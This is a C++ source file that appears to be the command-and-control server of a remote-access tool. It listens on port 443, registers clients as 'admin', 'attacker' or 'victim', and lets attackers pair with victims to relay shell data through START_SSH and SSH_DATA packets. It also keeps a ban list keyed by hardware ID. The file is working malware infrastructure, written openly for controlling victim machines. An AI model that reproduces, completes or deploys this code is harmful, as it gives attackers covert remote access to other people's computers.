#include "server.hpp"
#include "../commands.hpp"

#include <exception>
#include <fstream>
#include <sstream>

Server::Server()
{
	outputLog("");
	outputLog("loaded " + std::to_string(loadDatabase()) + " hId datapoint(s) from file");

	if (listener.listen(443) != sf::Socket::Status::Done) {
		outputLog("failed to listen on port 443");
		std::exit(-1);
	}
	selector.add(listener);
	
	try {
		const auto& pub = sf::IpAddress::getPublicAddress();
		const auto& priv = sf::IpAddress::getLocalAddress();
		const auto& port = std::to_string(listener.getLocalPort());
		outputLog("listening on port " + port + " (" + 
			priv.value().toString() + " / " + pub.value().toString() + ")");
	}
	catch (std::exception& e) {
		outputLog(e.what());
		std::exit(-2);
	}
	
	lastAwakeCheckTime = std::chrono::duration_cast<std::chrono::seconds>(
		std::chrono::system_clock::now().time_since_epoch()).count();
}

int Server::processIncoming()
{
	//disconnect inactive clients
	bool needSendClientList = false;
	try {
		size_t now = std::chrono::duration_cast<std::chrono::seconds>(
			std::chrono::system_clock::now().time_since_epoch()).count();

		if (now - lastAwakeCheckTime > 10) {
			needSendClientList = performAwakeCheck();
			lastAwakeCheckTime = now;
		}
	}
	catch (std::exception& e) {
		outputLog("awake checks: " + std::string(e.what()));
	}

	//wait for the selector to be ready
	if (!selector.wait(sf::seconds(1))) {
		sf::sleep(sf::milliseconds(1));
		return 0;
	}

	//listen for incoming connections
	try {
		if (selector.isReady(listener))
			acceptIncoming();
	}
	catch (std::exception& e) {
		outputLog("accept incoming: " + std::string(e.what()));
	}

	//listen for client communication
	std::set<std::string> bannedHIds;
	std::set<uint16_t> idsToDisconnect;
	try {
		for (auto& [id, c] : clients) {
			if (!selector.isReady(*c.socket))
				continue;

			handleCommunication(id, c, bannedHIds, idsToDisconnect);
		}
	}
	catch (std::exception& e) {
		outputLog("handle communication: " + std::string(e.what()));
	}

	//listen for initialization attempts
	std::set<uint16_t> initializedIds, idsToRemove;
	try {
		for (auto& [id, u] : uninitialized) {
			if (!selector.isReady(*u.socket))
				continue;

			auto code = initializeClient(id, u);
			if (code == 1)
				initializedIds.insert(id);
			else if (code == 2)
				idsToRemove.insert(id);
		}
	}
	catch (std::exception& e) {
		outputLog("initialize clients: " + std::string(e.what()));
	}
	
	//disconnect/ban all clients that need to
	try {
		//disconnect uninitialized clients
		for (const auto& id : idsToRemove) {
			selector.remove(*uninitialized[id].socket);
			delete uninitialized[id].socket;

			uninitialized.erase(id);
		}
		//initilize initialized clients
		for (const auto& id : initializedIds) {
			clients[id] = std::move(uninitialized[id]);

			uninitialized.erase(id);
		}
		//add banned clients to the kill list
		for (const auto& hId : bannedHIds) {
			for (auto& [id, c] : clients) {
				//check if client needs to be killed
				if (c.hId == hId && c.isAttacker && !c.isAdmin) {
					outputLog("attacker banned (" + std::to_string(id) + ")");
					idsToDisconnect.insert(id);
				}
			}
		}
		//kill all the clients that need to
		for (const auto& id : idsToDisconnect)
			disconnectClient(id);
	}
	catch (std::exception& e) {
		outputLog("clients disconnect: " + std::string(e.what()));
	}		
	
	if (idsToRemove.size() > 0 || initializedIds.size() > 0 || 
		bannedHIds.size() > 0 || idsToDisconnect.size() > 0 || needSendClientList)
		sendClientList();

	return 0;
}

bool Server::performAwakeCheck()
{
	bool needSendClientList = false;

	std::set<uint16_t> idsSleeping;
	for (auto& [id, c] : clients) {
		if (!c.isAwake)
			idsSleeping.insert(id);
		else
			c.isAwake = false;
	}
	for (auto id : idsSleeping) {
		outputLog("client timed out (" + std::to_string(id) + ")");
		disconnectClient(id);

		needSendClientList = true;
	}

	idsSleeping.clear();
	for (auto& [id, u] : uninitialized) {
		if (!u.isAwake)
			idsSleeping.insert(id);
		else
			u.isAwake = false;
	}
	for (auto id : idsSleeping) {
		outputLog("uninitialized client timed out (" + std::to_string(id) + ")");

		selector.remove(*uninitialized[id].socket);
		delete uninitialized[id].socket;
		uninitialized.erase(id);

		needSendClientList = true;
	}

	return needSendClientList;
}
void Server::acceptIncoming()
{
	Client c;
	c.socket = new sf::TcpSocket();

	//client accepted successfully
	if (listener.accept(*c.socket) == sf::Socket::Status::Done) {
		auto id = nextId++;
		uninitialized[id] = c;
		selector.add(*c.socket);

		outputLog("new connection (" + std::to_string(id) + ") = " +
			c.socket->getRemoteAddress().value().toString() + ":" +
			std::to_string(c.socket->getRemotePort()));
	}
	//failed to accept client 
	else
		delete c.socket;
}
void Server::handleCommunication(const uint16_t& id, Client& c,
	std::set<std::string>& bannedHIds, std::set<uint16_t>& idsToDisconnect)
{
	sf::Packet p;
	auto status = c.socket->receive(p);
	//forget disconnected client
	if (status == sf::Socket::Status::Disconnected) {
		outputLog("client disconnected (" + std::to_string(id) + ")");
		idsToDisconnect.insert(id);
		return;
	}
	else if (status != sf::Socket::Status::Done) {
		outputLog("code " + std::to_string(int(status)));
		return;
	}

	auto cmd = handlePacket(p, id, c, bannedHIds, idsToDisconnect);
	if (cmd != 0)
		outputLog("failed to process cmd " + std::to_string(cmd) + " from id " + std::to_string(id));
	else
		c.isAwake = true;

}
short Server::initializeClient(const uint16_t& id, Client& u)
{
	sf::Packet p;
	u.socket->setBlocking(false);
	auto status = u.socket->receive(p);
	u.socket->setBlocking(true);

	//forget disconnected client
	if (status == sf::Socket::Status::Disconnected) {
		outputLog("uninitialized client disconnected (" + std::to_string(id) + ")");
		return 2;
	}
	if (status != sf::Socket::Status::Done)
		return 0;

	std::uint16_t reqId;
	std::uint8_t cmd;
	std::string ver, hId;
	p >> reqId >> cmd >> ver >> hId;

	u.isAwake = true;
	bool isRouge = false;
	if (ver.size() < 3)
		isRouge = true;
	else if (ver[0] != '#' || ver.back() != '#')
		isRouge = true;
	if (isRouge) {
		outputLog("uninitialized client gone rogue (" + std::to_string(id) + ")");
		return 2;
	}

	//TODO: handle client version

	//accept admin
	if (cmd == std::uint8_t(Cmd::REGISTER_ADMIN)) {
		std::string pw;
		p >> pw;
		if (database.find(hId) == database.end())
			database[hId] = HIdInfo();

		//password is correct
		if (pw == adminPass) {
			sf::Packet res;
			res << reqId << bool(true) << uint16_t(id);
			auto _ = u.socket->send(res);

			u.isAttacker = true, u.isAdmin = true, u.hId = hId;

			outputLog(std::to_string(id) + " = admin: " + hId);
			return 1;
		}
		//password is not correct
		else {
			sf::Packet res;
			res << reqId << bool(false);
			auto _ = u.socket->send(res);

			outputLog("failed admin login (" + std::to_string(id) + ")");
			return 2;
		}
	}
	//accept attacker
	else if (cmd == std::uint8_t(Cmd::REGISTER_ATTACKER)) {
		if (database.find(hId) == database.end())
			database[hId] = HIdInfo();

		//access granted
		if (!database[hId].isBanned) {
			sf::Packet res;
			res << reqId << bool(true) << uint16_t(id);
			auto _ = u.socket->send(res);

			u.isAttacker = true, u.hId = hId;

			outputLog(std::to_string(id) + " = attacker: " + hId);
			return 1;
		}		
		//client is banned (access denied)
		else {
			sf::Packet res;
			res << reqId << bool(false);
			auto _ = u.socket->send(res);

			outputLog("banned client (" + std::to_string(id) + "): " + hId);
			return 2;
		}
	}
	//accept victim
	else if (cmd == std::uint8_t(Cmd::REGISTER_VICTIM)) {
		if (database.find(hId) == database.end())
			database[hId] = HIdInfo();

		sf::Packet res;
		res << reqId << bool(true) << uint16_t(id);
		auto _ = u.socket->send(res);

		u.isAttacker = false, u.hId = hId;

		outputLog(std::to_string(id) + " = victim: " + hId);
		return 1;
	}
	//unknown first command
	else {
		outputLog("uninitialized client gone rogue (" + std::to_string(id) + ")");
		return 2;
	}
}

uint8_t Server::handlePacket(sf::Packet& p, const uint16_t& id, Client& c,
	std::set<std::string>& bannedHIds, std::set<uint16_t>& idsToDisconnect)
{
	uint16_t reqId;
	uint8_t cmd;
	p >> reqId >> cmd;

	if (cmd == uint8_t(Cmd::PING)) 
		return 0;
	//stop ssh
	else if (cmd == uint8_t(Cmd::END_SSH)) {
		//not paired or invalid pairing
		if (c.sshId == 0 || clients.find(c.sshId) == clients.end())
			return cmd;

		sf::Packet res;
		res << uint16_t(0) << uint8_t(Cmd::END_SSH);
		auto _ = clients[c.sshId].socket->send(res);

		clients[c.sshId].sshId = 0;
		c.sshId = 0;
		return 0;
	}
	//send ssh data
	else if (cmd >= uint8_t(Cmd::SSH_DATA) && cmd < uint8_t(Cmd::SSH_DATA + 30)) {
		if (c.sshId == 0 || clients.find(c.sshId) == clients.end()) {
			sf::Packet res;
			res << uint16_t(0) << uint8_t(Cmd::END_SSH);
			auto _ = c.socket->send(res);
			return cmd;
		}

		auto _ = clients[c.sshId].socket->send(p);
		return 0;
	}

	if (!c.isAttacker)
		return cmd;

	//change client name
	if (cmd == uint8_t(Cmd::CHANGE_NAME)) {
		std::string hId, name;
		p >> hId >> name;
		if (c.isAdmin && database.find(hId) != database.end()) {
			database[hId].name = name;
			sendClientList();
		}
	}
	//ban client
	else if (cmd == uint8_t(Cmd::BAN_HID)) {
		std::string hId;
		p >> hId;

		if (c.isAdmin && database.find(hId) != database.end()) {
			if (!database[hId].isBanned) {
				database[hId].isBanned = true;
				bannedHIds.insert(hId);
			}
		}
	}
	//unban client
	else if (cmd == uint8_t(Cmd::UNBAN_HID)) {
		std::string hId;
		p >> hId;

		if (c.isAdmin && database.find(hId) != database.end()) {
			if (database[hId].isBanned) {
				database[hId].isBanned = false;
				sendClientList();
			}
		}
	}
	//kill client
	else if (cmd == uint8_t(Cmd::KILL)) {
		uint16_t id;
		p >> id;

		if (c.isAdmin && clients.find(id) != clients.end() && !clients[id].isAdmin) {
			outputLog("client killed (" + std::to_string(id) + ")");
		}
	}
	//save database to file
	else if (cmd == uint8_t(Cmd::SAVE_DATASET)) {
		if (!c.isAdmin)
			return cmd;

		saveDatabase();
		sf::Packet res;
		res << reqId;
		auto _ = c.socket->send(res);
	}
	//start ssh
	else if (cmd == uint8_t(Cmd::START_SSH)) {
		uint16_t oId;
		p >> oId;
		//1 = success, 2 = already paired, 3 = invalid id
		//4 = other id already paired
		uint8_t code = uint8_t(0);

		//this client is already paired
		if (c.sshId != 0)
			code = uint8_t(2);
		else if (id == oId)
			code = uint8_t(3);
		//check if the client exists
		else if (clients.find(oId) != clients.end()) {
			if (clients[oId].isAttacker)
				code = uint8_t(3);
			//other client is already paired
			else if (clients[oId].sshId != 0)
				code = uint8_t(4);
			else {
				clients[oId].sshId = id;
				c.sshId = oId;
				code = uint8_t(1);
			}
		}
		else
			code = uint8_t(3);

		sf::Packet res;
		res << reqId << code;
		auto _ = c.socket->send(res);

		if (code == uint8_t(1)) {
			res.clear();
			res << uint16_t(0) << uint8_t(Cmd::START_SSH);
			_ = clients[oId].socket->send(res);
		}
	}
	//unkown command
	else {
		outputLog("unknown command (" + std::to_string(id)
			+ "): " + std::to_string(int(cmd)));
	}

	return 0;
}

void Server::sendClientList() const
{
	sf::Packet admPacket, attPacket;
	admPacket << uint16_t(0) << uint8_t(Cmd::CLIENTS_UPDATE) << uint16_t(database.size());
	attPacket << uint16_t(0) << uint8_t(Cmd::CLIENTS_UPDATE) << uint16_t(0);

	for (const auto& [hId, info] : database)
		admPacket << hId << info.name << info.isBanned;

	admPacket << uint16_t(clients.size());
	attPacket << uint16_t(clients.size());

	for (const auto& [id, c] : clients) {
		std::string ip = c.socket->getRemoteAddress().value().toString() 
			+ ":" + std::to_string(c.socket->getRemotePort());

		admPacket << c.hId << ip << id << c.isAttacker << c.isAdmin;
		attPacket << c.hId << ip << id << c.isAttacker << c.isAdmin;
	}

	for (const auto& [id, c] : clients) {
		if (c.isAdmin)
			auto _ = c.socket->send(admPacket);
		else if (c.isAttacker)
			auto _ = c.socket->send(attPacket);
	}
}
void Server::disconnectClient(uint16_t id)
{
	if (clients.find(id) == clients.end()) {
		outputLog("disconnectClient: client not found (" + std::to_string(id) + ")");
		return;
	}

	//notify paired client about the disconnection
	if (clients[id].sshId != 0 && clients.find(clients[id].sshId) != clients.end()) {
		sf::Packet res;
		res << uint16_t(0) << uint8_t(Cmd::END_SSH);
		auto _ = clients[clients[id].sshId].socket->send(res);
		clients[clients[id].sshId].sshId = 0;
	}

	selector.remove(*clients[id].socket);
	delete clients[id].socket;

	clients.erase(id);
}

int Server::loadDatabase()
{
	std::fstream create(databasePath, std::ios::app);
	create.close();

	int num = 0;
	std::ifstream file(databasePath);

	std::string line = "";
	while (getline(file, line)) {
		if (line.find(',') == std::string::npos)
			continue;

		HIdInfo hIdInfo;
		std::string hId = line.substr(0, line.find_first_of(','));
		line = line.substr(line.find_first_of(',') + 1);
		hIdInfo.name = line.substr(0, line.find_first_of(','));
		line = line.substr(line.find_first_of(',') + 1);
		std::istringstream(line) >> hIdInfo.isBanned;

		database[hId] = hIdInfo;
		num++;
	}
	file.close();

	return num;
}
void Server::saveDatabase() const
{
	std::ofstream file(databasePath, std::ios::trunc);
	
	for (auto& [hId, info] : database)
		file << hId << "," << info.name << "," << info.isBanned << "\n";
	
	file.close();
}
